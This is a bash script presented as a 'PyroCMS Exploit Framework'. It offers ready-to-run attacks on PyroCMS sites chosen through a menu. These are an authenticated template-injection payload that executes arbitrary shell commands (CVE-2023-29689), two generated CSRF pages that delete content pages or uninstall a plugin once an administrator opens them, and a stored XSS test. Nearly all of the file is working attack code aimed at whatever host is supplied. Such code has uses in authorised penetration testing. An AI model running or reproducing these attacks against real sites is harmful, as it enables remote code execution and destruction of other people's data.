#!/bin/bash

# Argument check
if [ -z "$1" ]; then
    echo "Usage: $0 <Host to test, i.e. https://www.bigwalkdogs.com/>"
    exit 1
fi

HOST="$1"

# Let's see if you failed your job this early in the game
if ! curl -s --head "$HOST" > /dev/null; then
    echo "Host is not available. Exiting."
    exit 1
fi

# A utilitarian and minimally-augmented-by-aesthetics menu

show_menu() {
    clear
    echo "=============================================="
    echo "PyroCMS Exploit Framework - Choose CVE to test:"
    echo "=============================================="
    echo "1. CVE-2023-29689: (Authenticated) SSTI to RCE in PyroCMS v3.9"
    echo "2. CVE-2020-25262: CSRF leading to page deletion"
    echo "3. CVE-2020-25263: CSRF for plugin erasure"
    echo "4. (Low-Priv Authenticated) Stored XSS in PyroCMS 2.1.1"
    echo "5. Exit"
    echo "=============================================="
    echo "Enter your choice (1-5):"
}

# What's behind door number 1?
authenticated_ssti() {
    echo "SSTI to RCE in PyroCMS discovered by Daniel Barros (@cupc4k3d)"
    echo "Waves of praise and admiration will send Mr.Barros a creepy tickle and the wind will whipser his name every time this exploit runs successfully."
    echo "Thank you Daniel Barros.  Thank you for your sacrifice.\n\n"
    echo "Enter email:"
    read -r email

    echo "Enter password:"
    read -r -s password
    echo

    echo "Enter command (press Enter for default 'id'):"
    read -r command
    command=${command:-"id"}

    # Step 1: GET request to grab _token to /admin/login
    login_response=$(curl -s "$HOST/admin/login")
    token=$(echo "$login_response" | grep -oP 'name="_token" value="\K[^"]+')

    if [ -n "$token" ]; then
        echo "/admin/login page exists... Parsing response content for '_token'"
        echo "_token found! Sending POST request to login"

        # Step 2: Login with provided credentials
        login_data="{\"_token\":\"$token\",\"email\":\"$email\",\"password\":\"$password\"}"
        login_result=$(curl -s -X POST -H "Content-Type: application/json" -d "$login_data" "$HOST/admin/login")

        if echo "$login_result" | grep -q "Dashboard"; then
            echo "Login successful!"

            # Step 3: GET request to grab _token again
            edit_role_response=$(curl -s "$HOST/admin/users/roles/edit/1")
            role_token=$(echo "$edit_role_response" | grep -oP 'name="_token" value="\K[^"]+')

            if [ -n "$role_token" ]; then
                echo "Parsing response content for '_token' in /admin/users/roles/edit/1"

                # Step 4: Send POST request to edit role aka remote code execution via ssti injection
                edit_role_data="{\"_token\":\"$role_token\",\"name_en\":\"Admin\",\"slug\":\"admin\",\"description_en\":\"{{['$command']|map('system')|join}}\",\"action\":\"save_exit\"}"
                edit_role_result=$(curl -s -X POST -H "Content-Type: application/json" -d "$edit_role_data" "$HOST/admin/users/roles/edit/1")

                # Step 5: Get admin user's role description aka output of cmd
                get_role_response=$(curl -s "$HOST/admin/users/roles")
                description=$(echo "$get_role_response" | grep -oP 'Description.*?</td>' | sed 's/<[^>]*>//g')

                # Step 6: Hard work pays off
                echo "Description of admin user's role: $description"
                echo "Output of the command '$command':"
                echo "$edit_role_result"
            else
                echo "Token not found in /admin/users/roles/edit/1 page. WHY??"
            fi
        else
            echo "Somethings wrong with YOUR login information."
        fi
    else
        echo "Token not found in /admin/login page. Not vulnerable or something funny is going on here."
    fi
}

# Function to perform CSRF leading to page deletion
csrf_page_deletion() {
    echo "To test for this CSRF vulnerability, host the following payload on a remotely accessible server"
    echo "and send the link to an administrator of the target page. The victim must have privileges"
    echo "to delete pages of content. The payload has been saved to your current directory as 'CSRF-bleach-bomber.html'."
    echo "Credit to Farid007 who discovered this."

    # Create the payload file
    cat <<EOL >CSRF-bleach-bomber.html
<!DOCTYPE>
<html>
<head>
    <title></title>
    <script type="text/javascript">
        var url = "$HOST/admin/pages/delete/";
        for (var i = 1; i <= 13; i++) {
            var url1 = url + i;
            xhr = new XMLHttpRequest();
            xhr.open("GET", url1);
            xhr.withCredentials = true;
            xhr.send(null);
        }
    </script>
</head>
<body>
<!-- html content here -->
</body>
</html>
EOL

    echo "Payload saved as 'CSRF-bleach-bomber.html'"
}
# CSRF to erase plugins
csrf_plugin_erasure() {
    echo "Host the following payload. Then send the link to an administrator that is authenticated to the vulnerable PyroCMS domain."
    echo "They will release a friendly chuckle, as you have already informed them about their soon-to-be incinerated plugins"
    echo "because you'd never harm another internet-using friend or do anything that might make them sad or hurt their digital assets or valid feelings."
    echo "The payload has been saved in your current directory as 'CSRF-plugin-locked-napalm-missiles.html'"
    echo "Credit to Farid007 who discovered this."

    # Create the payload file
    cat <<EOL >CSRF-plugin-locked-napalm-missiles.html
<!DOCTYPE>
<html>
<head>
    <title></title>
    <script type="text/javascript">
        var url = "$HOST/admin/addons/uninstall/anomaly.module.blocks";
        xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
</head>
<body>
<!-- html content here -->
</body>
</html>
EOL

    echo "Payload saved as 'CSRF-plugin-locked-napalm-missiles.html'"
}
 Function to perform (Low-Priv Authenticated) Stored XSS in PyroCMS 2.1.1
stored_xss_low_priv() {
    echo "Enter email:"
    read -r email

    echo "Enter password:"
    read -r -s password
    echo

    # Step 1: Send a GET request to the login page to find the dynamic '_token'
    login_response=$(curl -s "$HOST/admin/login")
    token=$(echo "$login_response" | grep -oP 'name="_token" value="\K[^"]+')

    if [ -n "$token" ]; then
        echo "Dynamic '_token' found! Logging in..."

        # Step 2: Login with user's credentials
        login_data="{\"_token\":\"$token\",\"email\":\"$email\",\"password\":\"$password\"}"
        login_result=$(curl -s -X POST -H "Content-Type: application/json" -d "$login_data" "$HOST/admin/login")

        if echo "$login_result" | grep -q "Dashboard"; then
            echo "Login successful!"

            # Step 3: Finding CSRF hash so we can send a filthy evil request succesfully in a second...
            csrf_hash_name=$(echo "$login_result" | grep -oP 'csrf_hash_name"\s*:\s*"\K[^"]+')
            csrf_hash_value=$(echo "$login_result" | grep -oP 'csrf_hash"\s*:\s*"\K[^"]+')

            if [ -n "$csrf_hash_name" ] && [ -n "$csrf_hash_value" ]; then
                echo "Creating a blog entry with a simple XSS payload..."

                # Title the blog entry with a pathetic XSS payload, to illustrate how poorly the sanitization runs here
                xss_payload='"><script>alert(1);</script>'
                create_blog_data="{\"$csrf_hash_name\":\"$csrf_hash_value\",\"title\":\"$xss_payload\"}"
                create_blog_result=$(curl -s -X POST -H "Content-Type: application/json" -b cookies.txt -c cookies.txt -d "$create_blog_data" "$HOST/index.php/admin/blog/categories/create_ajax")

                # Step 4: Check if XSS payload is reflected
                if echo "$create_blog_result" | grep -q "$xss_payload"; then
                    echo "XSS payload reflected repulsively!  That was great, my friend."
                else
                    echo "XSS payload not reflected. Jason Haddix has been notified with your IP address and copies of your weak payload "
                fi
            else
                echo "CSRF parameters not found. The internet is fake."
            fi
        else
            echo "Login failed. What are we even doing right now?"
        fi
    else
        echo "Dynamic '_token' not found. Just one of many things that you will not find today throughout your life struggles."
    fi
}

# Main loop
while true; do
    show_menu
    read -rsn1 input

    case $input in
        1)
            authenticated_ssti
            ;;
        2)
            csrf_page_deletion
            ;;
        3)
            csrf_plugin_erasure
            ;;
        4)
            stored_xss_low_priv
            ;;
        5)
            echo "Exiting."
            exit 0
            ;;
        *)
            # Ignore other keys
            ;;
    esac
done
